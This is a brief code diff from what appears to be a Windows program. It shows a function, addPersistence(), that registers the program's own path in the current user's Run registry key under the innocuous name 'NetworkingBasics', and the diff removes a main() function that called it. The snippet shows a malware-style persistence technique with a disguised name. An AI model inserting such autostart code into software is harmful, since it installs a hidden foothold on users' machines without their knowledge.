@@ -66,8 +66,3 @@ void addPersistence(){
 	*/
 	writeToHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run","NetworkingBasics",string(filepath));
 }
-int main()
-{
-	addPersistence();
-	return 0;
-}
